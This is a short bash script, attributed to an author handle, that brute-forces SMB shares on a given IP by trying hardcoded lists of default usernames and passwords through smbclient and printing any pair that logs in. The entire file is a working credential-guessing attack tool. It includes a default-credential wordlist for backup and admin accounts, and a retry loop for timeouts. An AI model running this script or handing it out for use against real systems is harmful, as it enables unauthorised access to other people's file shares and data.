#!/bin/bash
# simple brute-force script that uses default credentials to break into smb shares
# Author: alwayslucky (@maxkleinke)

usernames=("" "guest" "Administrator" "admin" "arcserve" "tivoli" "tmersrvd" "backupexec" "backup" "test" "lab" "demo", "symbiator")
passwords=("" "password" "administrator" "admin" "arcserve" "backup" "tivoli" "tmersrvd" "backupexec" "backup" "arcada" "test" "lab" "demo", "symbiator", "as400")

#dictionary=([""]="", ["guest"]="", ["Administrator"]="", ["Administrator"]="password", ["Administrator"]="administrator", ["Administrator"]="admin", ["admin"]="", ["admin"]="password", ["admin"]="administrator", ["admin"]="admin", ["arcserve"]="arcserve", ["arcserve"]="backup", ["tivoli"]=)

if [[ $# < 1 ]]; then
    echo "usage: ./brutedefaultsmb.sh <ip>"
    exit 1;
fi

echo "Brute-forcing default credentials ..."

for username in ${usernames[*]}; do
    for password in ${passwords[*]}; do
        output=$(smbclient -U "$username%$password" //$1//IPC$ -c "")

        while [[ $output == *"NT_STATUS_IO_TIMEOUT"* ]]; do
            echo "Connection timed out ..."
            sleep 5
            output=$(smbclient -U "$username%$password" //$1//IPC$ -c "")
        done
        
        if [[ -z $output ]]; then
            echo "[+] Valid credentials found: username=$username, password=$password"
        fi
    done
done

echo "Done."
